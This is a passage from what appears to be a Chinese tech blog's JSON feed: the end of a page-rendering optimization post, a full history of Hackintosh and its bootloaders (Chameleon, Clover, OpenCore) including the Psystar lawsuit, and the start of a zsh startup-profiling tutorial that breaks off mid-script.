DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span 